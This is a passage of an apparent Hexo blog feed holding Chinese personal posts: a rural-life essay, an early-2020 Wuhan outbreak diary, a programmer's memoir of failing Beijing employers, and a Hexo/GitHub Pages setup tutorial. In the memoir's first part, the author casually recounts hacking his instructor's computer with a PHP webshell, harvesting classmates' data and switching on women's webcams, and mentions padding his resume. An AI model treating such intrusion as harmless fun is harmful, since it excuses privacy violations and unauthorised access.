<p>中国这种密集的高层小区便于管理，可以很好利用公共基础设施，同时方便了快递、外卖、共享单车等行业发展，但是其弊端已经在慢慢展现。</p>
<p>如果能解决交通问题，我相信很多人还是愿意住在郊区、住在农村，每天开车去城里上班，而不用住在城中心拥挤的出租房或者监狱一样的格子楼。</p>
<h2 id="人口红利在消失"><a href="#人口红利在消失" class="headerlink" title="人口红利在消失"></a>人口红利在消失</h2><p>这基本上已经是公认的事实，很多年轻人受过教育，再加上中国不是一个尊重蓝领的社会，所以很多都不太想从事体力劳动，宁愿去拍段子玩抖音也不会去送快递。</p>
<p>在北上广这样的一些城市，只要你肯吃苦，无论是送快递还是送外卖，这些体力活一个月上万收入不是问题。即使在很多工厂的流水线上面，现在一个月拿5-6000块钱也不是什么难事。</p>
<p>我们父母这一代现在很多已经50多岁，基本快干不动，90后已经快30岁了，这群人马上就要成为社会主力。在未来，只要是涉及人力的活以后的成本会越来越高，这一点我们可以参考美国等发达社会，蓝领的工资很多时候比在办公室的白领还高，这种趋势势不可挡。</p>
<h2 id="李子柒式农村生活"><a href="#李子柒式农村生活" class="headerlink" title="李子柒式农村生活"></a>李子柒式农村生活</h2><p>中国的农村在很多人的印象里面只有一个字：穷，农村人几乎已经成了穷人的代言词，现在除了个别风景优美的地区被开发成了风景区，大部分农村和美也沾不上边。</p>
<p>李子柒给大家营造了一个梦想中的田园生活，而现实中的农村生活往往充满了破败荒芜，每个人都在努力工作努力赚钱，憧憬着买房买车，亦或是为子女忙碌。大部分农村人背井离乡，只为在城里面买房定居，过上更好的生活。</p>
<img src="/images/2020-02-07-1.jpeg" /> 

<p>或许当我们无欲无求的时候，才可以像李子柒视频那样潇洒，日出而作，日落而息，双手去耕作，用汗水收获果实。</p>
<p>农村的田园生活已经离我们太遥远了，在工业化时代，规模经济是趋势，社会分工日益明确，你不用亲手去种植蔬菜，你只需要选择一个可以挣钱的工作就行，你可以是流水线工人，也可以是办公室白领。</p>
<h2 id="如果"><a href="#如果" class="headerlink" title="如果"></a>如果</h2><p>如果我可以选择，我选择与自然为舞，不被高房价绑架，也不必终日为工作劳累，花更多的时间陪陪家人！你会怎么选？</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>“武汉肺炎”小记</title>
    <url>/2020/life/wuhan-ncp.html</url>
    <content><![CDATA[<p>截止我写这篇文章的时候，这次肺炎病毒已经感染了数万人，而且还在持续增长！</p>
<img src="/images/2020-02-06.jpg" /> 

<p>每天醒来第一件事情就是打开手机，刷新一下数据，从最开始的几百人、到几千人、再到现在的几万人。。。在这里我想说说自己看到或者了解到的一些社会现象，谈谈自己的感受。</p>
<p>在我的记忆力，2003年还非常遥远，那时候我应该还在上初中，记得那时候学校被封闭，外人不得进出，教室每天早上都会有一股浓厚的消毒水味。</p>
<a id="more"></a>

<p>由于我平时也会逛逛油管，在油管上面有很多“时政”自媒体，这也就是一些墙外消息的来源，人所以很早之前也听过一些“谣言”，说说武汉出现SARS病毒了。这种非官方新闻我一般都是半信半疑，在没有确凿证据的情况下也不敢全信，更不敢传播，不然被定个罪就麻烦了。</p>
<p>2020年1月19日，新闻说北京大兴有2例确诊，当天上班的时候也有很多讨论这件事，这时候很多人开始慌张了，公司前台给大家发口罩，不过我并没有要。</p>
<p>我当时觉得这事并没有多大，毕竟连政府都没什么行动，北京才2例，觉得很多人有点大惊小怪，有些朋友开始跑医院买口罩，很多医院的口罩卖空，一下子口罩成了稀缺品。晚上坐地铁的时候发现大约有50%的人都戴了口罩。那会我还没有把这事放在心上，因为买不到口罩所以上班也没戴口罩，甚至感觉某些人反应过度，开始拼命的要买口罩。</p>
<p>我是2020年1月22日的火车，从北京南站出发，那时候我发现候车厅大约80%的人都戴了口罩，感觉事态有点严峻，由于我自己没口罩，所以刻意和其他人保持了距离。</p>
<img src="/images/2020-01-22.jpeg" /> 

<p>2020年1月22日晚，坊间传言武汉要封城，我一个朋友这时候正在回家的火车上，她刚好要从武汉转车，听她说车上人都慌了，有人怕封城出不去直接在中途郑州站下车了。后来正式新闻出来了，1月23日10点，武汉正式封城。</p>
<p>实际上，这会官方数据确诊只有几百人，但是这种封城动作让人胆战心惊，网上各种“谣言”四起，其实很多“谣言”都是来自墙外新闻，我一直也在油管上关注，有人说凡是官方辟谣的都是真的，不管你们信不信，我反正是信了。</p>
<p>过年这段时间，非常糟糕，在家里哪里都不能去，走亲访友的计划全部取消。。。然后接连不断的新闻爆出: 出门不戴口罩违法、封城、封村、挖坑断路、假期延长、武汉人被举报排挤，只见疫情事态逐步升级！</p>
<img src="/images/2020-01-27.jpeg" />

<p>由于我所在公司宣布2月3日起在家办公，但是我回家的时候并没有电脑，所以我决定2月2日返京。我们那高铁依然正常运行，入站的时候需要测体温，听说我走后第二天村就被封路了。</p>
<img src="/images/2020-02-02.jpeg" />

<p>火车站人确实很少，不过我那车刚好是晚上，本身人就不多，火车上卧铺上我那间6个床位只有我一个人，我走了一圈看了下，大部分床位都没人，看来返京的人确实不多。</p>
<p>到了北京，我进地铁的时候看见几个安检员在那嬉笑，居然没有给我测体温。网上新闻报道北京很多小区不允许租房的人进小区，我并没有遇到这种情况，只是在门口登记了一下，虽然配备了测温枪，但是那保安并没有给我测量体温。</p>
<p>有一件意料之外的事情，大家都知道这次疫情对工业、餐饮、娱乐、旅游、交通等很多行业是个致命的打击，可以说整个国家经济都受到影响，损失非常惨重。但是很多小的口罩厂却发财了，这些口罩厂原来多是生产一些工业口罩、一次性普通口罩或者布口罩，原来卖几毛钱一个，利润率非常低，甚至可以说濒临倒闭，现在可以卖几块钱一个，虽然从单价上看并不贵，但是价格缺翻了很多倍。大家知道现在口罩太难买了，我至今出门只戴了一个布口罩，心理安慰是其一，主要是不戴口罩出不了门。短期内很多工厂都开不了工，口罩的缺口依然很大，毕竟中国有14亿人口，平时戴口罩的人很少，市场需求不大，现在人人都要戴口罩，即使所有口罩厂全力生产也无法满足需求，现在连一次性的普通口罩都买不到，更别说什么N95口罩。</p>
<p>这次病毒什么时候是个头？很多公司原定10号正式返岗上班的计划又遍了，有人说15号或许是个拐点，也有人得到2月底，很多地方的管控越来越严。</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>一个野生程序员的北漂之路（三）</title>
    <url>/2020/life/2019-3.html</url>
    <content><![CDATA[<p>上篇文章说到我二家公司由于经营不善，濒临倒闭，拖欠工资，最终我选择自离找工作。</p>
<p>2018年03月，这次找工作非常顺序，我请假面了大概5个公司拿到2个offer，最后选择了一家我觉得还可以的公司，xx网，工资15k。</p>
<blockquote>
<p>xx网实际上是某大型教育公司下面一个部门的网站，专门面向程序员，并不是公司名字，很多学习编程的同学应该看过他们网站的课程。</p>
</blockquote>
<p>之前也看过他们网站的课程，觉得很不错，这个部门有100多人，其中技术40多人，在这家公司的上班体验总体还不错，除了每天早上无聊的站会以及每周周会，公司属于业务驱动型，大多做的一些业务开发。</p>
<p>直到2018年底春节放假那天，技术老大拉我进屋，悄悄告诉我，经过公司决定，你今年没有年终奖，我当时一脸懵逼，问他为什么？</p>
<a id="more"></a>

<p>他吞吞吐吐说因为什么线上bug，但是也说不清楚，说只是通知我一声，怕我不了解情况以为是漏发了。</p>
<p>后来得知不止我一个人，总共有好几个人都没有年终奖，据老员工透露一般没有年终奖的过完年会给n+1，意思就是过完年裁员会给n+1赔偿，公司也不是第一次这样干。</p>
<img src="/images/20200202152512.jpg" /> 

<p>其实裁员我可以理解，为什么都是我们年初刚入职的员工呢？了解才得知原来整个公司去年早就换血了，只剩下几个小组leader是老员工，其它都是新来的。</p>
<p>我更不理解，虽然这一年我表现不算突出，但也算是兢兢业业，努力工作，为什么选择我呢？我想过很多原因，直到离职后来听一个同事说，公司给他们涨薪了，但是名额有限，老大给他自己河南老乡全部涨了…</p>
<p>我平时大多数都是埋头写代码，不擅长在领导面前表现，一年下来基本上没有和老大聊过什么，他也只在周会的时候会询问项目进度，更别说其它的事情了，如果说bug的话，写代码谁没有bug。</p>
<p>这时候我突然想起来公司年初的骚操作，年初公司入职的人非常多，正常是3个月试用期，然而就在试用期快结束的时候，有几个同事被告知试用期不合格，被辞退，我在办的入职他们在办离职。如果不合适就不要招人进来，招人之后干了3个月最后一天辞退，这种行为实在恶心。</p>
<p>过完年回来之后，我在忙完手头的工作，拿了2个月补偿就走了，对这种公司我没有什么留恋，也不想多待一天。</p>
<img src="/images/20200202152503.jpg" /> 

<p>公司有一个同事和我比较熟，后来聊天的时候他说他工资比较低，只有12k，老大过年前和他说年后给他涨工资，但是一直到次年6月份都没有兑现，最后他也走了。</p>
<blockquote>
<p>后来才得知，这家公司，负责这个项目的老大是销售出身，集团公司给我们部门定了销售KPI，由于远远没有达到预期目标，所以就拿技术开刀，不是第一次这样了，每年都会裁人招人，公司的文化就是这样，谁遇到谁倒霉。</p>
</blockquote>
<p>本以为这是一个拥有2000多人的公司，应该会稳定点，没想到我又栽了，又得重新找工作了。</p>
<hr>
<p>2019年03月，我重新整理了简历，开始了面试，这时候招聘市场早一年不如一年了，非常艰难，我的直属领导其实还挺好，找关系给我内推了，也给了offer，虽然最后我没去那家公司。</p>
<p>面了半月，拿到几个offer，有些薪资太低就没去了，有些是因为公司太小，不想去创业公司了。最终去了一家互联网金融集团下面的子公司，这家公司技术团队有200多人，我们部门有15个人，从技术团队建设上说，这家公司其实非常不错，比我去过的所有公司都要好。</p>
<blockquote>
<p>刚入职那会我对p2p还没什么概念，虽然也看了新闻，知道国家一直在管理规范p2p，清退一些不合格企业，但是这个公司借贷规模上百亿，也是上市公司，论体量也属于头部公司了，应该没问题。</p>
</blockquote>
<img src="/images/20200202154032.jpg" /> 

<p>2019年07月，董事长突然来公司给大家开了一个临时会议，给大家透露了一些情况，主要就是说政策又变了，公司非常难，他在努力解决困难，公司平台遭到挤兑，暂停提现了，如果大家有人要走，他也不拦着。这时候我才知道事情的严峻性，国家可能不会给p2p活路了。</p>
<p>一直在公司被抓之前，公司陆续有人离职，也在陆续招人，我们部门走了2个，我心里知道其实早就会有这一天，只是时间问题，但是我没有选择走，一方面是我们部门领导对我还行，中间还给我提了一次涨薪，虽然不多，还有就考虑到我刚来公司不久离职工作也不好找工作，决定再坚持一段时间，心想至少等过完年再看吧。</p>
<p>那会公司依然正常运行，工资不仅没有拖欠，经常还提前发，公司还给所有人都买了商业医疗补充保险，一切正常，谁也不知道哪一天什么时候到来。</p>
<p>2019年12月，早上，我还在地铁上，有人在公司群里说公司下面有好几辆警车，还有大巴，让我们先不要进公司，出事了。有些早上到公司的同事电话也打不通，谁也不知道是什么情况，直到下午5点某地公安局在网上发了一个蓝色通告，坐实被抓了。</p>
<blockquote>
<p>后来得知，那些同事都被警察安排坐在工位上，没收手机电脑，上厕所有人跟着，中午吃的盒饭，最终下午6点多的时候才放出来，公司所有电脑无论个人还是公司的，全部被查封带走调查了。</p>
</blockquote>
<p>领导让我们在家等消息，其实大家心里都清楚，基本上是完了，接连不断的新闻告诉我们，即使公司没有问题，p2p也是完了。。。</p>
<p>其实公司有没有问题我真不知道，有人担心作为公司员工会被追缴工资，这一点暂时还不确定，目前案件还在审理中，我也是受害者，我还在里面投资了1万多，也一样没有拿出来。</p>
<p>就这样，我又失业了…</p>
<hr>
<p>这几年，不知道是不是该说运气不好，之前的创业公司倒闭很正常，最近2年的公司规模也算比较大，但结局却一样悲惨，正如很多人说的垃圾公司毁一生，选择很重要，你不知道你进的公司是什么公司，特别是很多不出名的中小型公司，你也不知道你会遇到什么样的领导。</p>
<p>我知道以我现在的简历，很多公司都过不了，很多HR一看就认为跳槽频繁，工作不稳定，再加上非科班出身，出路很少！</p>
<p>我对自己的评价是工作态度认真负责、学习理解能力强，但是我并不是大牛，也不是那种可以手撸各种算法、精通各种源码和底层原理的技术大佬。</p>
<p>虽然这些年很多叫我大佬，但我知道那也只是客气话，技术这行了解的越多会发现你不会的更多，而且对于互联网技术现在基本上大家已经形成共识：淘汰快。</p>
<p>以前觉得技术很厉害，可以改变世界，现在觉得改变世界的其实是商业、是资本，技术只不过是商业工具，有时候也充当打手。</p>
<p>这几年一直很焦虑，实际上大部分技术人都是这样，总感觉有太多东西要去学，这个算法那个数据结构、xx架构、xx源码解读，卖课的公众号数不胜数，每天都在贩卖焦虑，看不完的技术视频和文章。。。</p>
<p>我现在甚至不太想去写代码了，这是一份相当枯燥和无聊的工作，你需要去解读产品的X逼需求，应付领导的傻X检查，去做很多和技术无关的工作！而且大部分公司并不重视你的代码质量，他们只关心项目进度，能不能按时上线，能不能为他带来利益。</p>
<p>最后，就这样吧，谢谢阅读！希望新的一年有新的变化！</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>一个野生程序员的北漂之路（二）</title>
    <url>/2020/life/2019-2.html</url>
    <content><![CDATA[<p>上篇文章说到我第一家公司因为融资断裂，发不起工资，解散了。这时候我们开发里面一位大佬，这里我称他为Q哥，他也刚进公司不久，如果按职级分，他应该属于高级开发工程师，平时带我们做项目，也会参与开发，毕竟当时公司开发人员不多。</p>
<p>当时他说他有个朋友给他介绍了一个公司，这公司非常缺人，可以直接带我们过去，不用技术面试，他和老板聊好了，我们过去见一下老板就行了。</p>
<a id="more"></a>

<p>第二天，我们几个人和老板在一个大酒店的套房里面见了面，老板看上去比较老，大概50多岁，叼着雪茄和我们聊了一些他的往事人生以及一些商业战略，最后还请我们吃了一顿简餐。</p>
<p>搞定了老板基本上就没问题了，老板想让我们直接入职，但公司的HR不答应，最后还给我们安排了一个HR面试，聊了聊人生以及薪资待遇，我没有要求涨薪，其中有一个小伙伴因为薪资没谈拢最后没去，最终Q哥带着我们上家公司总共不到10人空降了该公司。</p>
<blockquote>
<p>后来得知，其实这个公司也不完全是缺人，他们之前有一个不到10人的开发团队，但是项目开发进度缓慢，处于失败的边缘。听说老板花了上百万开了一个盛大的发布会，但是APP还没上线，延期很久，老板非常生气，想把技术团队都开除。</p>
</blockquote>
<p>我们空降之后，就立马开始了1个多月的封闭开发，加班加点，Q哥也一直盯着开发进度，最终顺利完成了预期目标。作为奖励，年底整个技术团队获得了一次海南三亚游，次年6月，公司搬入望京SOHO，换了一个非常大的办公室。</p>
<img src="/images/2020-01-03-1.jpg" /> 

<blockquote>
<p>后来了解，这老板花钱请了很多大公司的顾问，有几个BAT的技术顾问，也许是出于融资对外宣传需求，给人感觉很强大，而且技术团队之前一直是有这个百度的大佬兼职带队，就是不知道为什么进度缓慢，也没做出什么东西，据说他们之前已经做了一年多了。</p>
</blockquote>
<p>APP顺利上线后，看上去公司蒸蒸日上，但运营了几个月后发现并没有什么效果，此时Q哥主要心思不在技术上，甚至说他几乎不管技术，突然搞起运营了，亲自带队搞运营，这也最终导致了他的出走。</p>
<p>公司失败的原因有很多种，可能是这个老头子最终发现很多人都在围着他转，看上的是他的钱并没有用心做事，再加上他本身喜欢对产品指指点点，喜欢按着自己的想法做，比如说根据自己的想法给APP加一个功能，也从不考虑用户，整个公司说是面向老板开发也不过分。</p>
<p>2017年10月，由于业务基本上无增长，而且据说一年花了2000万，老板不想再投钱了，公司开始裁员，裁了几个人，办公室也从望京SOHO搬到望京西很偏的一个小商住两用办公楼，各种福利缩减，刚开始工资还能正常发放，后来每月都要拖欠工资，很多人开始离职。</p>
<img src="/images/2020-01-04-1.jpg" /> 

<blockquote>
<p>老板其实挺有钱，早年发家，经常去美国，那边也有业务，家人都在国外，拔过他的背景，也有些黑料，但人并不傻。这次创业应该在我来之前大约2年前就开始了，只不过不是这个公司，这个公司是后来重新注册，应该属于第二波尝试，这样几番折腾，几年下来基本上算是创业失败了。</p>
</blockquote>
<p>当时有的人劳动合同到期，公司也表示不再续期，让自己走人，没有什么工作可干，但是公司后面也不再裁员了，但是工资经常拖欠，不能按时发放，等到2018年春节之后，公司很多人都在找工作，我也趁机走了。</p>
<blockquote>
<p>不过还有同事没走继续在那边干，听他说后来没走的人每个月工资只发了一半，到最后人基本上都跑光了，可以说结果很悲催。</p>
</blockquote>
<p>我上一家公司虽然也是创业公司，但是最后起码好聚好散，但这家公司了老板最终选择故意拖欠工资逼你自己离职，当时很多人说要一起去告公司，不最终还是不了了之。</p>
<p>说到Q哥，我对他非常感激，他人很不错，但是说实话缺少领导力，感激是因为他带我进入这家公司，虽然最后发现是个火坑，但是这也不能怪他，谁也无法预料后来的事情。还有一点不信任是因为他后来的行为，他在这家公司大部分时间并没有管理技术，没有当好CTO，却去插上并扛下运营和产品，最终由于他的运营方案失败，自己出走，留下我们几个人不知所措。</p>
<p>他出走之后却又带着一位同事进入另一家类似公司，而这家公司一直是用比较传统的方法运营，但是其互联网这块是从零开始，老板据说是从华为出来，印象挺深的是我们第一次Q哥带我们和他见面的时候，刚下班还没吃晚饭，他说请我们吃饭，最后带着我们几个人在路边找了家面馆一人吃了一碗面，场面甚是尴尬！</p>
<p>Q哥说他技术入股，先带一个人过去，又拉了一个他以前的同事，等这边搞起来后期我们一起再过去。</p>
<p>可是好景不长，这家公司只持续了几个月，他们第一版东西做完之后，这个华为出来的老板居然打了退堂鼓，不想干了，不仅没有和他们签合同，连工资都一直拖着不发，最后沟通很久说可以搬电脑抵工资。。。结局就是就这么狗血！</p>
<p>这时候Q哥说又有朋友介绍一家新公司，说这家公司就是为了上市，资金实力雄厚，他以顾问的身份进去，可以推荐我们进去。。。说实话，经过这么多，我有点怕了，怕了创业公司。。。另外对Q哥的信任度也大大降低!</p>
<img src="/images/2020-01-17.jpg" /> 

<blockquote>
<p>Q哥是第一代北漂，比我们大不了多少岁，也是农村出来，但是来的早，赶上了IT行业发展的黄金时代，而且那会北京房价也不高，现在在北京有房有车，老婆孩子都很好，在我看来，算上成功人士了。但他自己好像并不是这么觉得，他觉得自己还没财务自由，总想做点事情出来，30多岁也算年轻，不想写代码，创业是个不错的选择。</p>
</blockquote>
<p>但是我其实并不想把所有宝都压在创业上面，我其实想找一个相对稳定的公司，所以后来他让我去他那边公司的时候我犹豫了，我最后决定自己投简历…</p>
<blockquote>
<p>虽然很久没有和Q哥聊了，但是知道他一直在创业，现在在做一个教育相关的小程序，希望他早日创业成功！</p>
</blockquote>
<p>这1年多，看尽了创业公司的各种结局，很多小创业公司九死一生，但是结局却各不相同。很多创业公司倒闭并不是因为技术，大部分都是因为商业模式，或者说是运营不起来，没有市场等各种原因，总之，创业难，想创业成功更难。</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>一个野生程序员的北漂之路（一）</title>
    <url>/2020/life/2019-1.html</url>
    <content><![CDATA[<p>虽然2020年已经到来，但是真正象征着新的一年的农历新年才刚刚开始，北漂4年多，IT这条路越走越窄，突然萌生出回家的念头，毕竟年龄也不小，算是90后最早一批奔三的人，还未成家，也谈不上立业。</p>
<p>在此回顾一下这些年在北京这几年的职业生涯，作为一种记录，也算是总结吧！</p>
<p>这些年在北京，工作换了很多个，几乎每年面试一次，微信里面同事倒是加了不少，除了聊的好的几个，大部分再也不联系。住的地方也是一年换一次，住过上下铺、地下室、天通苑、自如、一居室。。。</p>
<ul>
<li>2016年06月 第一家公司 –&gt; 融资失败、解散</li>
<li>2016年11月 第二家公司 –&gt; 濒临倒闭、欠薪</li>
<li>2018年03月 第三家公司 –&gt; 经营不善、裁员</li>
<li>2019年03月 第四家公司 –&gt; 涉及p2p、查封</li>
</ul>
<a id="more"></a>

<p>2015年10月，也许是在外漂泊够了（在此之前我一直在从事一份非常自由的工作），腰里揣着几万块钱，我决定来北京，去报名某智的培训班，学习Java。</p>
<p>为什么我要这么做？主要是因为从大学时代开始，我对编程就非常感兴趣，写过一点C，经常喜欢看一些关于计算机和网络的书籍，但是当时没有想过深入的学习，更没有想过毕业后会从事该行业，那时候纯粹是一些兴趣爱好。后在2013年的时候，在网上看到一些自学成才的例子，开始有这个想法，在家里自学过半年Java，买了几本书，也看了不少视频，但是最终因为各种原因并没有实际去找相关工作，曾经考虑过进培训班，但是当时也没钱就打消了这个念头，后来误打误撞去干别的事情了。</p>
<blockquote>
<p>现在回想起来，当时犯了一些错：单打独斗、学习效率不高、缺乏自信。主要是缺乏有经验的人指导，如果坚持下去或许是另一种结果，毕竟2013年那会IT的工作很好找，不像现在年年寒冬，各种裁员。</p>
</blockquote>
<p>时间回到2015年10月，这时候我已经有一定的经济能力，但是工作依然不稳定和明朗，也不知道该干啥去，但是觉得不能一直这么干下去，最终选择来北京培训，这个培训班的学费也从当年的几千块涨到1万多，不过尚可以接受。</p>
<p>不过最终报名的时候我选择了PHP，并没有学习Java，我当时主要是因为有人说PHP适合个人等中小型开发，而Java主要适合大型企业公司，其实现在这个说法也没错，但是当时我并不了解其实国内大厂都是Java的天下，PHP最终走向穷途末路。</p>
<img src="/images/2020-01-02.jpg" />  

<p>由于我几年前学过C和Java，相当于有基础，所以在培训班非常轻松，很多知识似曾相识，甚至觉得老师讲的太无聊，基本上就是照本宣书，填鸭式教学。同时也发现培训班就像高中一样，有很多学习能力超级差的同学，也有学习能力强的人，我旁边有一些让我感觉属于那种怎么教都教不会的人，非常可惜他们听了培训机构的忽悠，花了很多钱，最终可能无法找到工作。</p>
<blockquote>
<p>那会我开始研究Linux，天天折腾Ubuntu，还有Kali，最有意思的是我用Kali的木马工具生成一些木马，然后利用PHP一句话木马攻破讲师的电脑，远程控制其电脑，还在其电脑上找到了我们班所有人的信息。<br>还有，比如说控制某些女生的电脑，打开其摄像头。。。不过纯属搞笑娱乐，并没有做一些过分的事情。</p>
</blockquote>
<p>在培训的这几个月里面，我真正学到东西不是很多，培训班大部分讲的东西都很基础，而且枯燥，老师每一个知识点写一个demo，缺乏编程思想层次的指导。对我来说最大的意义在于这段培训经历帮我建立了自信，因为我发现在所有的同学中我即使不是能力最强的，也是属于前排，心里对自己的能力有了一个定位。</p>
<p>时间过的很快，半年后，2016年5月，我们开始找工作了，出于无耐，我编了一个1年经验的简历，也有一些同学编了2-3年，还有更过分的则是造假学历、假毕业证，虽然这些都是培训机构默认的常规操作。</p>
<p>我这个人本身就不属于那种会说的人，以前撒谎都会脸红那种，虽然进入社会好几年但是依然无法做到游刃有余，在找了差不多半个月，面试了10几家公司之后终于拿到一个offer，虽然公司不大也是创业公司有10来个开发，但是毕竟是一个开始，工资是12k，社保最低缴纳，对我来说已经很好了，据说在所有的同学中算高的了，可能是因为我有一个本科学历吧，那时候大部分培训的同学都是专科。</p>
<blockquote>
<p>那会2016年正是创业潮，初创企业层出不穷，所以市场对开发人员有很大需求，所以像我这种半路出家的非科班选手依然有市场。</p>
</blockquote>
<p>第一次正式参加公司的编程开发工作，心里还有点紧张，很努力，不过也基本上都hold住了，然而这段工作并没有维持多久。。。</p>
<img src="/images/2020-01-03.jpg" /> 

<p>2016年11月，公司突然撑不住了。我之前一直没有关注这方面的消息，直到某一天老板说公司融资断了，发不起工资了，如果大家继续留下来也没有工资发，晚上一起吃个散伙饭吧！</p>
<p>那天是当月的20号，公司最后给每个人发了3000块钱，剩下的说先欠着，等哪天融到钱会第一时间给大家发工资，也可以继续回来工作，公司40多号人没有一个人提赔偿的事情，大家吃完饭喝完酒默默走人了，毕竟老板平时为人不错，不摆架子，好聚好散。</p>
<blockquote>
<p>这几年一直和其中一个同事有联系，听他说公司并没有倒闭，留了几个老员工做一些维护和少量开发工作，他就是其一。老板也在一直拉投资，客户也一直在增长，那年与其说倒闭，不如说是壮士断臂。在2018年底的时候，他和我说公司拉到了一笔投资，也不多，大概有几百万，公司正在招人扩大规模。我一直相信老板的话，觉得公司融到钱后把欠我们的半个月工资还给我们，事实上，至今老板从未和我们谈过这件事，我也未去询问过。不过我还是非常佩服这位老板的耐心和毅力，祝他早日能创业成功。</p>
</blockquote>
<p>在工作了还不到半年的时候，突然间我又失业了，又得重新找工作，但是事情却另有转机。。。</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo+Github搭建免费技术博客</title>
    <url>/2020/linux/hexo-github-blog.html</url>
    <content><![CDATA[<p>最近想搭建了一个自己的博客网站，经过调研，最终决定使用Hexo+Github的形式搭建，大概花了3个小时的时间，这里简单记录一下过程，备用。</p>
<h2 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h2><p>Github提供了一个免费的GIthub Pages功能，简单说就是可以让你存放静态的资源文件，比如css、js、html、image，同时会给你分配一个免费域名，格式：<a href="https://xxx.github.io" target="_blank" rel="noopener">https://xxx.github.io</a></p>
<p>所以你只需要注册一个Github账号，然后新建一个repository就行了，一毛线都不用花。</p>
<p>由于Github Pages只能托管静态资源，所以像WordPress这类博客肯定是无法运行的，这时候你有2种选择：</p>
<ol>
<li>手写静态页面，如果是前端大牛可以尝试这样</li>
<li>第三方博客工具生成，如Hexo、jekyll</li>
</ol>
<a id="more"></a>

<p>简单说，Hexo就是一个工具，它可以根据markdown文档自动生成博客的静态HTML页面，同时呢，你还可以一键换主题，网上有很多开源的主题。</p>
<p>Hexo 和 Github这2个完全可以单独使用，但是把2个结合起来就完美了，一个用来生成博客的静态文件，一个用户托管静态资源，服务器和域名都省了。</p>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ol>
<li><p>我不会告诉你如何注册Github账号、以及安装使用Git，作为一名编程开发人员应该都会</p>
</li>
<li><p>我其实也不想告诉你如何安装npm和node，但是我还是放个下载地址：<a href="https://nodejs.org/zh-cn" target="_blank" rel="noopener">https://nodejs.org/zh-cn</a></p>
</li>
</ol>
<h2 id="Hexo应用"><a href="#Hexo应用" class="headerlink" title="Hexo应用"></a>Hexo应用</h2><h3 id="安装运行环境"><a href="#安装运行环境" class="headerlink" title="安装运行环境"></a>安装运行环境</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>

<p>安装完成后，在命令行下执行hexo，应该可以看到以下输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jwang@jun:~$ hexo</span><br><span class="line">Usage: hexo &lt;command&gt;</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  help     Get help on a command.</span><br><span class="line">  init     Create a new Hexo folder.</span><br><span class="line">  version  Display version information.</span><br><span class="line"></span><br><span class="line">Global Options:</span><br><span class="line">  --config  Specify config file instead of using _config.yml</span><br><span class="line">  --cwd     Specify the CWD</span><br><span class="line">  --debug   Display all verbose messages in the terminal</span><br><span class="line">  --draft   Display draft posts</span><br><span class="line">  --safe    Disable all plugins and scripts</span><br><span class="line">  --silent  Hide output on console</span><br><span class="line"></span><br><span class="line">For more help, you can use &#39;hexo help [command]&#39; for the detailed information</span><br><span class="line">or you can check the docs: https:&#x2F;&#x2F;hexo.io&#x2F;docs&#x2F;</span><br></pre></td></tr></table></figure>

<p>这里只是列出一部分命令，比较重要的就是init，它是用来创建一个新项目</p>
<h3 id="创建博客"><a href="#创建博客" class="headerlink" title="创建博客"></a>创建博客</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo init blog</span><br></pre></td></tr></table></figure>

<p>文件夹名字自己起一个，它自动生成一个目录，里面文件如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">├── _config.yml</span><br><span class="line">├── db.json</span><br><span class="line">├── package.json</span><br><span class="line">├── package-lock.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── source</span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure>
<blockquote>
<p>简单说明一下，比较重要是有_config.yml文件,这是博客的配置，另外themes下是存放主题的目录，还有source下面的 _posts 目录，是博客文章markdown的源文件。</p>
</blockquote>
<p>然后我们进入该目录，生成静态文件并启动服务预览一下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd blog</span><br><span class="line"></span><br><span class="line">hexo g</span><br><span class="line"></span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
<p>默认启动在本地4000端口，可以通过 -p 指定端口</p>
<h3 id="写博客"><a href="#写博客" class="headerlink" title="写博客"></a>写博客</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new &lt;article-name&gt;</span><br></pre></td></tr></table></figure>

<p>其实有2种方式写文章，一种是使用上述命令 new 一个，它会自动在source目录的_posts里面创建一个markdown文件。另一种就是你自己手动创建。</p>
<p>但是注意，文章头部会有一些注解：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">title: Hexo+Github搭建免费技术博客</span><br><span class="line">date: 2020-01-08 12:05:45</span><br><span class="line">tags: Hexo</span><br><span class="line">category: 其它</span><br></pre></td></tr></table></figure>
<p>Hexo在生成静态页面的时候会解析这些注解，然后做一些处理，比如tags是标签、category是文章分类，都会用到。</p>
<p>不要忘记，每次更新文章之后，都需要执行<code>hexo g</code>重新生成静态页面。</p>
<h2 id="部署到GitPages"><a href="#部署到GitPages" class="headerlink" title="部署到GitPages"></a>部署到GitPages</h2><p>上面介绍如何使用Hexo生成博客，但是这时候只能在本地玩，如果你有自己的服务器的话，也可以不用GitPages，你把生成的静态文件，也就是public目录下的文件部署到你自己的服务器就行了。</p>
<p>如果你想部署到GitPages，那么继续接着看</p>
<blockquote>
<p>有一点需要注意，在创建GitPage仓库的时候，仓库名字最好是: 你的用户名.github.io 这种格式，如果不这样其实也行，就是分配的域名有点丑，比如说你仓库名字叫blog，那么域名就会变成 xxx.github.io/blog</p>
</blockquote>
<p>打开Hexo的配置文件_config.yml，修改repo为刚创建的仓库地址：</p>
